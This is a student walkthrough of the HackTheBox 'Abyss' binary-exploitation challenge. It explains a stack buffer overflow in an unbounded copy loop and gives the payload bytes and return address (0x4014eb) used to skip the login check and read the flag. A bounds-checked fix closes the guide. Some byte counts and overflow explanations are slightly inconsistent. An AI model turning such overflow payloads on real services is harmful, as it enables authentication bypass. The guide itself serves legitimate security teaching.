# HTB Abyss - Visual Guide for Students

## 🎯 Challenge Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     HTB Abyss Challenge                     │
│                                                             │
│  Category: Pwn (Binary Exploitation)                       │
│  Difficulty: Easy                                           │
│  Points: 1000                                               │
│                                                             │
│  Goal: Read flag.txt without valid credentials             │
└─────────────────────────────────────────────────────────────┘
```

---

## 📋 The Program Flow (Normal)

```
User connects
    │
    ▼
┌─────────────────┐
│  Main Loop      │
│  Waits for cmd  │
└────────┬────────┘
         │
         ├──► LOGIN (0) ──► cmd_login()
         │                     │
         │                     ├─► Read USERNAME
         │                     ├─► Read PASSWORD  
         │                     ├─► Compare with .creds
         │                     │
         │                     ▼
         │                  [Check fails: random creds]
         │                     │
         │                     ▼
         │                  logged_in = 0
         │
         ├──► READ (1) ──► cmd_read()
         │                     │
         │                     ├─► Check if logged_in == 1
         │                     ├─► ❌ NOT LOGGED IN!
         │                     └─► Exit
         │
         └──► EXIT (2) ──► Close connection
```

**Problem:** We can't login because credentials are random!

---

## 💥 The Vulnerability Explained

### Step 1: How The Loop Works (Vulnerable Code)

```c
char buf[512];    // Our input buffer
char user[512];   // Username storage
int i;

read(0, buf, 512);  // Read up to 512 bytes

// THE VULNERABLE LOOP:
i = 5;  // Start after "USER "
while (buf[i] != '\0') {
    user[i - 5] = buf[i];
    i++;
}
```

### Step 2: Normal Behavior

```
Input: "USER admin\0" (11 bytes)

buf[0]  = 'U'
buf[1]  = 'S'
buf[2]  = 'E'
buf[3]  = 'R'
buf[4]  = ' '
buf[5]  = 'a'  ──► user[0] = 'a'
buf[6]  = 'd'  ──► user[1] = 'd'
buf[7]  = 'm'  ──► user[2] = 'm'
buf[8]  = 'i'  ──► user[3] = 'i'
buf[9]  = 'n'  ──► user[4] = 'n'
buf[10] = '\0' ──► STOP! Loop ends
```

✅ **Safe:** Loop stops at null byte

### Step 3: Attack Behavior

```
Input: 512 bytes with NO null terminator!

buf[0]   = 'U'
buf[1]   = 'S'
buf[2]   = 'E'
buf[3]   = 'R'
buf[4]   = ' '
buf[5]   = 'A'  ──► user[0] = 'A'
buf[6]   = 'A'  ──► user[1] = 'A'
...
buf[511] = 'A'  ──► user[506] = 'A'
buf[512] = ???  ──► user[507] = ??? (OUT OF BOUNDS!)
buf[513] = ???  ──► user[508] = ??? (OVERFLOW!)
...keeps going until it finds '\0'...
```

⚠️ **Dangerous:** No null byte = infinite loop = buffer overflow!

---

## 🏗️ Memory Layout (The Stack)

### Visual Representation

```
        Higher Memory Addresses (0x7fff...)
                    ▲
                    │
        ┌───────────────────────┐
        │   Return Address      │  ◄─── We want to overwrite THIS!
        │   (Where function     │       (Points to 0x4014eb)
        │    returns to)        │
        ├───────────────────────┤
        │   Saved RBP           │
        │   (Stack frame ptr)   │
        ├───────────────────────┤
        │   Local var: i        │
        │   (Loop counter)      │
        ├───────────────────────┤
        │                       │
        │   pass[512 bytes]     │  ◄─── Password buffer
        │                       │
        ├───────────────────────┤
        │                       │
        │   user[512 bytes]     │  ◄─── Username buffer
        │                       │
        ├───────────────────────┤
        │                       │
        │   buf[512 bytes]      │  ◄─── Our input goes here!
        │                       │
        └───────────────────────┘
                    │
                    ▼
        Lower Memory Addresses (0x7fff...)
```

### When We Overflow

```
Step 1: Fill buf[512] completely
    ┌─────────────────┐
    │ "USER " + 507   │ ◄─── No null terminator!
    │ bytes of data   │
    └─────────────────┘
            │
            ▼
Step 2: Loop continues reading BEYOND buf
    ┌─────────────────┐
    │ buf[512]...     │ ◄─── Actually reading from user[] memory!
    │ buf[513]...     │
    └─────────────────┘
            │
            ▼
Step 3: Writes to user[], then pass[], then...
    ┌─────────────────┐
    │ user[507]...    │ ◄─── Writing past user[] boundary
    │ pass[0]...      │ ◄─── Into pass[] buffer
    │ ...             │
    │ Return Address! │ ◄─── Eventually overwrites this!
    └─────────────────┘
```

---

## 🎯 The Exploit Strategy

### Visual Attack Flow

```
Step 1: Send LOGIN Command
    ┌──────────────┐
    │  p32(0)      │ ──► Tell server we want to login
    └──────────────┘

Step 2: Send Crafted USER Payload
    ┌────────────────────────────────────────────┐
    │ "USER " + crafted_data + return_address    │
    └────────────────────────────────────────────┘
                        │
                        ▼
           Sets up the buffer overflow

Step 3: Send PASS Payload (Trigger!)
    ┌────────────────────────────────┐
    │ "PASS " + 507 bytes            │ ──► Triggers overflow
    └────────────────────────────────┘        │
                                               ▼
                                    ┌──────────────────────┐
                                    │ Overwrites return    │
                                    │ address to 0x4014eb  │
                                    └──────────────────────┘

Step 4: Function Returns
    ┌──────────────┐
    │ cmd_login()  │
    │ finishes     │
    └──────┬───────┘
           │
           ├─► NORMAL: Returns to main()
           │
           └─► EXPLOIT: Returns to 0x4014eb (cmd_read!)
                            │
                            ▼
                ┌────────────────────────────┐
                │  cmd_read() after auth!    │
                │  logged_in check skipped!  │
                └────────────────────────────┘

Step 5: Send Filename
    ┌──────────────┐
    │ "flag.txt"   │ ──► Read the flag!
    └──────────────┘
           │
           ▼
    ┌──────────────────────────────────────────────────┐
    │ HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_...}       │
    └──────────────────────────────────────────────────┘
```

---

## 🔍 Key Address Breakdown

### Where We Jump To

```
    cmd_read() Function:
    
    0x4014a9:  <function starts>
    ...
    0x4014e5:  mov eax, [logged_in]  ◄─── Checks if logged in
    0x4014eb:  test eax, eax          ◄─── WE JUMP HERE! ⭐
    0x4014ed:  jne 0x401500           ◄─── Skip "not logged in"
    0x4014ef:  puts "Not logged in"   ◄─── This gets skipped
    0x4014fb:  jmp 0x4015b3
    0x401500:  <reads filename>       ◄─── Execution continues here
    0x401507:  <opens file>
    0x401514:  <reads file>
    0x401536:  <writes to socket>
    ...
```

**Why 0x4014eb?**
- It's right after the logged_in check
- Makes the program think we're authenticated
- Bypasses the authentication without cracking passwords!

---

## 🧪 Testing Locally

### Setup Local Environment

```bash
# 1. Navigate to challenge directory
cd /home/kali/Downloads/HTB\ CTF/pwn/abyss/challenge

# 2. Create test credentials
echo "testuser:testpass" > .creds

# 3. Run the binary (in one terminal)
./abyss

# 4. Run exploit (in another terminal)
cd ..
python3 solution.py
```

---

## 📝 Code Walkthrough

### The Exploit Payload Breakdown

```python
# This is the magic payload:
user_payload = b"USER " + b"AAAAAAAABBBBBBBBC\x1c" + b"DDDDEEEEEEE" + p32(0x4014eb)

# Let's break it down:
# ┌─────┬──────────────────────┬──────────┬─────────────┬────────────────┐
# │USER │ AAAAAAAABBBBBBBBBC   │   \x1c   │ DDDDEEEEEEE │  p32(0x4014eb) │
# └─────┴──────────────────────┴──────────┴─────────────┴────────────────┘
#   5B          17 bytes           1 byte     11 bytes       4 bytes
#                                    │
#                                    └─► Magic byte (controls loop)
#
# Total: 5 + 17 + 1 + 11 + 4 = 38 bytes

# Then we send PASS to trigger:
pass_payload = b"PASS " + b"D" * 507  # Fill entire buffer
#                └──────────────────┘
#                   507 bytes total
```

---

## 🐛 Common Mistakes & Fixes

### Mistake 1: Wrong Target Address
```python
❌ WRONG: p32(0x401500)  # Too far, misses the trick
❌ WRONG: p32(0x401485)  # Wrong offset
✅ RIGHT: p32(0x4014eb)  # Correct address!
```

### Mistake 2: Wrong Payload Size
```python
❌ WRONG: b"PASS " + b"D" * 512  # Too much!
✅ RIGHT: b"PASS " + b"D" * 507  # Exactly right
```

### Mistake 3: Forgetting Sleep/Timing
```python
❌ WRONG: Send all at once without delays
✅ RIGHT: sleep(0.2) between sends
```

---

## 🎓 Study Questions & Answers

### Q1: What is the vulnerability type?
**A:** Stack-based buffer overflow due to missing bounds check in string copy loop.

### Q2: Why can't we just login normally?
**A:** The credentials are randomly generated (15 characters each) and we don't know them.

### Q3: What does the exploit overwrite?
**A:** The return address on the stack, making cmd_login() return to cmd_read() instead of main().

### Q4: Why jump to 0x4014eb specifically?
**A:** It's right after the authentication check in cmd_read(), so we bypass the login requirement.

### Q5: How would you fix this vulnerability?
**A:** Add bounds checking:
```c
size_t max_len = sizeof(user) - 1;
while (buf[i] != '\0' && (i - 5) < max_len) {
    user[i - 5] = buf[i];
    i++;
}
user[i - 5] = '\0';  // Always null-terminate
```

---

## 🎯 Success Criteria

You understand this challenge if you can:

✅ Explain what a buffer overflow is  
✅ Draw the stack layout from memory  
✅ Explain why the loop is vulnerable  
✅ Describe how the return address gets overwritten  
✅ Explain why we jump to 0x4014eb  
✅ Write code to fix the vulnerability  

---

## 🚀 Next Steps

1. **Practice More:** Try HTB "Regularity" (Very Easy)
2. **Learn Assembly:** Understand what objdump shows
3. **Study GDB:** Debug exploits step-by-step
4. **Read Code:** Analyze more C programs for bugs
5. **Build Tools:** Create your own exploit scripts

---

**Remember:** Security is about understanding how things break!

*Happy Learning! 📚🔐*
